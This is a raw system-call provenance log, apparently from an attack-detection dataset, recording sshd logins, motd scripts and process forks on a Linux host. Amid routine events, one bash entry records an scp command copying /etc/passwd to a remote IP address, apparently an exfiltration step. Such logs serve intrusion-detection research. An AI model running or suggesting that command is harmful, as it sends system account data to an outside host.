1557706748.492:1441083973,D28A87FA-5B94-9AA8-157E-9CBAC8EB93DE:run-parts,EXECUTE,976EE74B-10D3-D364-21DE-16F4E49AE75A,50-landscape-sy,ta1-trace-2
1557706748.492:1441083972,C8135C09-8423-BA1D-C55D-FA43E64AD0B2:run-parts,FORK,D28A87FA-5B94-9AA8-157E-9CBAC8EB93DE,run-parts,ta1-trace-2
1557706748.488:1441083663,5A7AE840-61B0-37A7-F4E3-D2461AAF41BB:env,EXECUTE,C8135C09-8423-BA1D-C55D-FA43E64AD0B2,run-parts,ta1-trace-2
1557706748.488:1441083628,F61FD521-1F25-EE7C-6E16-0859F7FBF4F1:sh,EXECUTE,5A7AE840-61B0-37A7-F4E3-D2461AAF41BB,env,ta1-trace-2
1557706748.488:1441083612,F1661026-1DA2-0B4A-7F4E-DB87441CA7BD:sh,FORK,F61FD521-1F25-EE7C-6E16-0859F7FBF4F1,sh,ta1-trace-2
1557706748.488:1441083524,0112E923-51A8-950B-F58B-9AF616302C4E:sshd,EXECUTE,F1661026-1DA2-0B4A-7F4E-DB87441CA7BD,sh,ta1-trace-2
1557706748.488:1441083478,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,FORK,0112E923-51A8-950B-F58B-9AF616302C4E,sshd,ta1-trace-2
1557706748.488:1441083459,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706748.464:1441083157,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706748.464:1441083105,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706748.464:1441083093,CFD35A58-375D-DB5D-19F8-FAC29DF922D8:sshd,CHANGE_PRINCIPAL,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A,sshd,ta1-trace-2
1557706748.464:1441083092,712D4E8E-A28B-376E-F214-20DC90ED80EE:sshd,CHANGE_PRINCIPAL,CFD35A58-375D-DB5D-19F8-FAC29DF922D8,sshd,ta1-trace-2
1557706748.464:1441083091,CFD35A58-375D-DB5D-19F8-FAC29DF922D8:sshd,CHANGE_PRINCIPAL,712D4E8E-A28B-376E-F214-20DC90ED80EE,sshd,ta1-trace-2
1557706748.464:1441083090,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,CHANGE_PRINCIPAL,CFD35A58-375D-DB5D-19F8-FAC29DF922D8,sshd,ta1-trace-2
1557706748.464:1441083088,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706748.464:1441083074,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706748.464:1441083034,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557706748.464:1441083031,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706748.456:1441083006,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557706748.456:1441083003,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706748.356:1441082780,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706748.356:1441082748,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557706748.356:1441082747,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557706748.268:1441082533,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706748.264:1441082277,9245EB1F-CA4F-3585-9A18-D84736F2A7A5:sshd,EXECUTE,2CA65ABB-7FBF-CD7D-EB77-BAB436B75B6A,sshd,ta1-trace-2
1557706748.264:1441082256,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,9245EB1F-CA4F-3585-9A18-D84736F2A7A5,sshd,ta1-trace-2
1557706746.120:1441079625,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706746.120:1441079562,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706746.116:1441079489,82F715F4-61BC-00EB-29ED-BDE79326AE5F:sshd,CHANGE_PRINCIPAL,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15,sshd,ta1-trace-2
1557706746.116:1441079488,82F715F4-61BC-00EB-29ED-BDE79326AE5F:sshd,CHANGE_PRINCIPAL,82F715F4-61BC-00EB-29ED-BDE79326AE5F,sshd,ta1-trace-2
1557706746.116:1441079487,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,CHANGE_PRINCIPAL,82F715F4-61BC-00EB-29ED-BDE79326AE5F,sshd,ta1-trace-2
1557706745.000:1441079291,3BFBD324-FD7D-A7D0-4489-2A518A4C23B4:scp,READ,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.120:1441077249,A5DC6F29-2D88-60D0-6DD8-9EA538F1CA53:ssh,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.120:1441077246,A5DC6F29-2D88-60D0-6DD8-9EA538F1CA53:ssh,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.120:1441077243,A5DC6F29-2D88-60D0-6DD8-9EA538F1CA53:ssh,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.120:1441077240,A5DC6F29-2D88-60D0-6DD8-9EA538F1CA53:ssh,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.120:1441077237,A5DC6F29-2D88-60D0-6DD8-9EA538F1CA53:ssh,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.120:1441077234,A5DC6F29-2D88-60D0-6DD8-9EA538F1CA53:ssh,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.120:1441077231,A5DC6F29-2D88-60D0-6DD8-9EA538F1CA53:ssh,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.116:1441077209,A5DC6F29-2D88-60D0-6DD8-9EA538F1CA53:ssh,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.116:1441077114,6DBE3347-7A3B-1CB8-B5AD-3E56A81C0242:scp,EXECUTE,A5DC6F29-2D88-60D0-6DD8-9EA538F1CA53,ssh,ta1-trace-2
1557706743.116:1441077105,3BFBD324-FD7D-A7D0-4489-2A518A4C23B4:scp,FORK,6DBE3347-7A3B-1CB8-B5AD-3E56A81C0242,scp,ta1-trace-2
1557706743.116:1441077098,3BFBD324-FD7D-A7D0-4489-2A518A4C23B4:scp,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706743.116:1441077037,FDEA53EA-B63F-099B-C203-B0AB5B85D616:bash,EXECUTE,3BFBD324-FD7D-A7D0-4489-2A518A4C23B4,b'scp -r /etc/passwd admin@128.55.12.56:\\C:WindowsTemp',ta1-trace-2
1557706743.116:1441077031,445BEDF2-DB5B-75FE-4471-A49FFA1C1AC2:bash,FORK,FDEA53EA-B63F-099B-C203-B0AB5B85D616,bash,ta1-trace-2
1557706742.940:1441074176,445BEDF2-DB5B-75FE-4471-A49FFA1C1AC2:bash,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.940:1441074093,0376083D-5B00-8390-5C67-97C40251EAAA:sshd,EXECUTE,445BEDF2-DB5B-75FE-4471-A49FFA1C1AC2,bash,ta1-trace-2
1557706742.936:1441073982,81DFEDD1-D159-A448-0435-9C6689683D13:sshd,FORK,0376083D-5B00-8390-5C67-97C40251EAAA,sshd,ta1-trace-2
1557706742.936:1441073936,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.936:1441073930,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.936:1441073910,77240911-6366-57A8-84B0-D22933824673:sshd,CHANGE_PRINCIPAL,81DFEDD1-D159-A448-0435-9C6689683D13,sshd,ta1-trace-2
1557706742.936:1441073888,59EF3C4E-88C4-87AF-16AE-1B020A226324:sshd,CHANGE_PRINCIPAL,77240911-6366-57A8-84B0-D22933824673,sshd,ta1-trace-2
1557706742.936:1441073885,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,FORK,59EF3C4E-88C4-87AF-16AE-1B020A226324,sshd,ta1-trace-2
1557706742.936:1441073876,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.936:1441073840,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.936:1441073837,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.936:1441073834,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.936:1441073758,1C0235EB-CB26-2D2D-5D9E-5C55DBD7F1FE:update-motd-fsc,EXECUTE,765EFA97-3D21-04F0-9FAD-F4910F2DB8C5,cat,ta1-trace-2
1557706742.936:1441073756,BD23E031-E54E-96D1-0209-57C7C5AD41A3:update-motd-fsc,FORK,1C0235EB-CB26-2D2D-5D9E-5C55DBD7F1FE,update-motd-fsc,ta1-trace-2
1557706742.932:1441073541,9E99E6A9-2910-6374-A4E9-C5A12B0010F6:98-fsck-at-rebo,EXECUTE,BD23E031-E54E-96D1-0209-57C7C5AD41A3,update-motd-fsc,ta1-trace-2
1557706742.932:1441073519,F134E226-4EBA-50FD-38FC-41F64EBB6502:run-parts,EXECUTE,9E99E6A9-2910-6374-A4E9-C5A12B0010F6,98-fsck-at-rebo,ta1-trace-2
1557706742.932:1441073518,4A931272-2C81-1F50-81E9-055499AC8AC6:run-parts,FORK,F134E226-4EBA-50FD-38FC-41F64EBB6502,run-parts,ta1-trace-2
1557706742.932:1441073469,A4A148D9-BF43-4EF4-C093-99E58351174B:update-motd-hwe,EXECUTE,4F089D94-FB45-014D-337F-7EBEDD2E72AB,cat,ta1-trace-2
1557706742.932:1441073467,CDA6606F-B91A-4D29-9A4A-9F292B1CA02C:update-motd-hwe,FORK,A4A148D9-BF43-4EF4-C093-99E58351174B,update-motd-hwe,ta1-trace-2
1557706742.912:1441072124,1E8DAEDF-A13E-ED4B-514C-F880278C6EB3:95-hwe-eol,EXECUTE,CDA6606F-B91A-4D29-9A4A-9F292B1CA02C,update-motd-hwe,ta1-trace-2
1557706742.912:1441072103,BBB727C0-98B5-BA5C-3AF1-B8E592BA5204:run-parts,EXECUTE,1E8DAEDF-A13E-ED4B-514C-F880278C6EB3,95-hwe-eol,ta1-trace-2
1557706742.912:1441072102,4A931272-2C81-1F50-81E9-055499AC8AC6:run-parts,FORK,BBB727C0-98B5-BA5C-3AF1-B8E592BA5204,run-parts,ta1-trace-2
1557706742.892:1441071766,E8D0498B-266C-51DF-CEDB-3D084AFDF127:lsb_release,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.884:1441071526,A5EA4D47-4245-094C-BEF1-22CD04FBD5E4:91-release-upgr,EXECUTE,E8D0498B-266C-51DF-CEDB-3D084AFDF127,lsb_release,ta1-trace-2
1557706742.884:1441071517,68F614E8-746B-C647-3F69-CB94FCC7D9F6:91-release-upgr,FORK,A5EA4D47-4245-094C-BEF1-22CD04FBD5E4,91-release-upgr,ta1-trace-2
1557706742.884:1441071510,A681B3EA-CA4D-FC73-59DC-6ABDBE0D2D60:91-release-upgr,FORK,68F614E8-746B-C647-3F69-CB94FCC7D9F6,91-release-upgr,ta1-trace-2
1557706742.880:1441071488,F1249B09-7BAF-4188-0F38-58B6C56E64ED:run-parts,EXECUTE,A681B3EA-CA4D-FC73-59DC-6ABDBE0D2D60,91-release-upgr,ta1-trace-2
1557706742.880:1441071487,4A931272-2C81-1F50-81E9-055499AC8AC6:run-parts,FORK,F1249B09-7BAF-4188-0F38-58B6C56E64ED,run-parts,ta1-trace-2
1557706742.880:1441071461,3553683A-50B5-1BE3-E000-7EF1D205A2A8:update-motd-upd,EXECUTE,87C32F37-9133-BC8D-A194-0A76D8F708F2,cat,ta1-trace-2
1557706742.880:1441071459,88E56FC8-B421-BA16-F19E-DDE05C7E2DAD:update-motd-upd,FORK,3553683A-50B5-1BE3-E000-7EF1D205A2A8,update-motd-upd,ta1-trace-2
1557706742.864:1441070427,A89385E7-CD8C-7FAD-FC5A-CD752D406132:90-updates-avai,EXECUTE,88E56FC8-B421-BA16-F19E-DDE05C7E2DAD,update-motd-upd,ta1-trace-2
1557706742.736:1441063473,5C3DD5D4-2A60-A4CA-2023-A03F5B537B2D:landscape-sysin,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.732:1441063070,68426E49-3F75-7431-7008-129F988C1C66:50-landscape-sy,EXECUTE,5C3DD5D4-2A60-A4CA-2023-A03F5B537B2D,landscape-sysin,ta1-trace-2
1557706742.732:1441063068,105EDC4A-E6C9-892D-B642-A417B0D5018A:50-landscape-sy,FORK,68426E49-3F75-7431-7008-129F988C1C66,50-landscape-sy,ta1-trace-2
1557706742.728:1441062823,5E38428C-2F57-8261-BA6B-731AC8C86EAC:run-parts,EXECUTE,105EDC4A-E6C9-892D-B642-A417B0D5018A,50-landscape-sy,ta1-trace-2
1557706742.728:1441062819,4A931272-2C81-1F50-81E9-055499AC8AC6:run-parts,FORK,5E38428C-2F57-8261-BA6B-731AC8C86EAC,run-parts,ta1-trace-2
1557706742.724:1441062487,3F6A80E9-2CF3-B331-295A-84D011AD0420:env,EXECUTE,4A931272-2C81-1F50-81E9-055499AC8AC6,run-parts,ta1-trace-2
1557706742.724:1441062453,77DA1263-7766-EC9E-82D4-4A634BDD36EC:sh,EXECUTE,3F6A80E9-2CF3-B331-295A-84D011AD0420,env,ta1-trace-2
1557706742.724:1441062440,39D27CE6-DA52-5B97-A70C-2E91AD3D5855:sh,FORK,77DA1263-7766-EC9E-82D4-4A634BDD36EC,sh,ta1-trace-2
1557706742.724:1441062398,F0AC8263-2A6A-3ADB-45BD-699211CE7617:sshd,EXECUTE,39D27CE6-DA52-5B97-A70C-2E91AD3D5855,sh,ta1-trace-2
1557706742.724:1441062335,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,FORK,F0AC8263-2A6A-3ADB-45BD-699211CE7617,sshd,ta1-trace-2
1557706742.724:1441062313,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.708:1441062173,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.708:1441062121,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.708:1441062109,F328B9D0-1E88-74E8-4F01-59F241C7F20F:sshd,CHANGE_PRINCIPAL,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15,sshd,ta1-trace-2
1557706742.708:1441062108,43E8392E-0A53-6847-03D9-A7059C0B0D25:sshd,CHANGE_PRINCIPAL,F328B9D0-1E88-74E8-4F01-59F241C7F20F,sshd,ta1-trace-2
1557706742.708:1441062107,F328B9D0-1E88-74E8-4F01-59F241C7F20F:sshd,CHANGE_PRINCIPAL,43E8392E-0A53-6847-03D9-A7059C0B0D25,sshd,ta1-trace-2
1557706742.708:1441062106,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,CHANGE_PRINCIPAL,F328B9D0-1E88-74E8-4F01-59F241C7F20F,sshd,ta1-trace-2
1557706742.708:1441062104,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.704:1441062090,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.704:1441062050,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557706742.704:1441062047,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.700:1441062022,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557706742.700:1441062019,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.600:1441061092,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.600:1441061060,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557706742.600:1441061059,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557706742.516:1441060845,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706742.512:1441060589,306472B4-FCC9-4905-217E-366DCD95E67D:sshd,EXECUTE,ADDCFCEB-FFD3-7A72-D3C1-A825B7489A15,sshd,ta1-trace-2
1557706742.512:1441060568,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,306472B4-FCC9-4905-217E-366DCD95E67D,sshd,ta1-trace-2
1557706734.376:1441055322,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706734.376:1441055226,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706734.376:1441055164,20FBBF15-4CD4-7B10-9E3A-9EE6AD92CA2E:sshd,CHANGE_PRINCIPAL,62BB0BF0-62D8-9119-E650-21C68C743C58,sshd,ta1-trace-2
1557706734.376:1441055163,20FBBF15-4CD4-7B10-9E3A-9EE6AD92CA2E:sshd,CHANGE_PRINCIPAL,20FBBF15-4CD4-7B10-9E3A-9EE6AD92CA2E,sshd,ta1-trace-2
1557706734.376:1441055162,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,CHANGE_PRINCIPAL,20FBBF15-4CD4-7B10-9E3A-9EE6AD92CA2E,sshd,ta1-trace-2
1557706734.040:1441050338,29AE8365-5B1A-63AB-A89B-FB4667BF5B1A:bash,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706734.036:1441050255,CE49665B-414F-44E9-45D0-7DD4C6C67669:sshd,EXECUTE,29AE8365-5B1A-63AB-A89B-FB4667BF5B1A,bash,ta1-trace-2
1557706734.036:1441050157,8100D232-7B23-0F49-8C62-51820B441CBA:sshd,FORK,CE49665B-414F-44E9-45D0-7DD4C6C67669,sshd,ta1-trace-2
1557706734.036:1441050111,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706734.036:1441050105,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706734.036:1441050085,1D8A2773-E3FA-C3BE-31F7-C212067A3A49:sshd,CHANGE_PRINCIPAL,8100D232-7B23-0F49-8C62-51820B441CBA,sshd,ta1-trace-2
1557706734.036:1441050063,01EDEFC3-E04F-7A46-9994-CB327A39110D:sshd,CHANGE_PRINCIPAL,1D8A2773-E3FA-C3BE-31F7-C212067A3A49,sshd,ta1-trace-2
1557706734.036:1441050060,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,FORK,01EDEFC3-E04F-7A46-9994-CB327A39110D,sshd,ta1-trace-2
1557706734.036:1441050050,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706734.036:1441050014,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706734.036:1441050011,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706734.036:1441050008,62BB0BF0-62D8-9119-E650-21C68C743C58:sshd,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706734.032:1441049932,3C06B319-AE05-790B-30B6-FB279B79EB0A:update-motd-fsc,EXECUTE,BAEE41C9-86EE-CA07-CCFE-E150EDEE314E,cat,ta1-trace-2
1557706734.032:1441049930,34C4D52E-8208-2FC4-559C-6CBC6D1712FC:update-motd-fsc,FORK,3C06B319-AE05-790B-30B6-FB279B79EB0A,update-motd-fsc,ta1-trace-2
1557706734.032:1441049715,43D00027-1F71-6674-6219-282FEB7F6441:98-fsck-at-rebo,EXECUTE,34C4D52E-8208-2FC4-559C-6CBC6D1712FC,update-motd-fsc,ta1-trace-2
1557706734.032:1441049693,E9C5F07D-07D6-F95E-8E40-FD3EB5839499:run-parts,EXECUTE,43D00027-1F71-6674-6219-282FEB7F6441,98-fsck-at-rebo,ta1-trace-2
1557706734.032:1441049692,113F83F9-B5B6-1EB9-27ED-A7F0B1F493B8:run-parts,FORK,E9C5F07D-07D6-F95E-8E40-FD3EB5839499,run-parts,ta1-trace-2
1557706734.028:1441049643,682995AB-7D6C-6D11-64CD-754ACE5A005B:update-motd-hwe,EXECUTE,677A7505-9D4A-5518-04FC-F14BB9E4B6FC,cat,ta1-trace-2
1557706734.028:1441049641,D458B48B-0594-2695-47FF-259D2F8F4854:update-motd-hwe,FORK,682995AB-7D6C-6D11-64CD-754ACE5A005B,update-motd-hwe,ta1-trace-2
1557706734.012:1441048296,DB1BC737-D11D-D743-6339-2173A3FAF788:95-hwe-eol,EXECUTE,D458B48B-0594-2695-47FF-259D2F8F4854,update-motd-hwe,ta1-trace-2
1557706734.012:1441048275,990A94F6-D0CF-EBD4-04DA-4D940681846A:run-parts,EXECUTE,DB1BC737-D11D-D743-6339-2173A3FAF788,95-hwe-eol,ta1-trace-2
1557706734.012:1441048274,113F83F9-B5B6-1EB9-27ED-A7F0B1F493B8:run-parts,FORK,990A94F6-D0CF-EBD4-04DA-4D940681846A,run-parts,ta1-trace-2
1557706733.992:1441047935,3F6061CA-7AE6-FAC8-E82C-E734C54D3369:lsb_release,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706733.984:1441047694,56D89566-093D-73A9-E404-F83F9FAAE04F:91-release-upgr,EXECUTE,3F6061CA-7AE6-FAC8-E82C-E734C54D3369,lsb_release,ta1-trace-2
1557706733.984:1441047685,93FA24EF-F3F3-FD61-B25E-611AEB056DDC:91-release-upgr,FORK,56D89566-093D-73A9-E404-F83F9FAAE04F,91-release-upgr,ta1-trace-2
1557706733.984:1441047678,67B86804-5BD3-3D6E-6AD0-DE5265B1D5BD:91-release-upgr,FORK,93FA24EF-F3F3-FD61-B25E-611AEB056DDC,91-release-upgr,ta1-trace-2
1557706733.984:1441047656,5D32292D-96C0-C8E9-00DE-6CFF173DF7CD:run-parts,EXECUTE,67B86804-5BD3-3D6E-6AD0-DE5265B1D5BD,91-release-upgr,ta1-trace-2
1557706733.984:1441047655,113F83F9-B5B6-1EB9-27ED-A7F0B1F493B8:run-parts,FORK,5D32292D-96C0-C8E9-00DE-6CFF173DF7CD,run-parts,ta1-trace-2
1557706733.980:1441047629,95E572CB-FAE5-B208-4E12-1FA378C7E5CB:update-motd-upd,EXECUTE,B128DB67-AE1B-21DF-F35B-58B78BB248B0,cat,ta1-trace-2
1557706733.980:1441047627,8B797915-8ABD-028F-E87F-635CD07F22B9:update-motd-upd,FORK,95E572CB-FAE5-B208-4E12-1FA378C7E5CB,update-motd-upd,ta1-trace-2
1557706733.956:1441046592,CA88A3EA-C40E-FA05-829F-B29FD0E39C9A:90-updates-avai,EXECUTE,8B797915-8ABD-028F-E87F-635CD07F22B9,update-motd-upd,ta1-trace-2
1557706733.952:1441046571,66796BE3-31B9-0575-539E-778A3E0A3E4F:run-parts,EXECUTE,CA88A3EA-C40E-FA05-829F-B29FD0E39C9A,90-updates-avai,ta1-trace-2
1557706733.952:1441046570,113F83F9-B5B6-1EB9-27ED-A7F0B1F493B8:run-parts,FORK,66796BE3-31B9-0575-539E-778A3E0A3E4F,run-parts,ta1-trace-2
1557706733.840:1441039593,125C2D85-1E1B-E351-ABF0-2F5014565269:landscape-sysin,MMAP,28479135-9154-4D76-7BE4-8E7048254F03,/etc/passwd,ta1-trace-2
1557706733.832:1441039159,DEBAB1F1-1771-776B-9FAF-1A21EB892602:50-landscape-sy,EXECUTE,125C2D85-1E1B-E351-ABF0-2F5014565269,landscape-sysin,ta1-trace-2
1557706733.832:1441039157,81FD5C9F-7A5D-00FF-CC22-32F52CD66EA9:50-landscape-sy,FORK,DEBAB1F1-1771-776B-9FAF-1A21EB892602,50-landscape-sy,ta1-trace-2
1557706733.832:1441038892,0AF04A6E-21F2-F731-2DC6-1DE2BAF775B5:run-parts,EXECUTE,81FD5C9F-7A5D-00FF-CC22-32F52CD66EA9,50-landscape-sy,ta1-trace-2
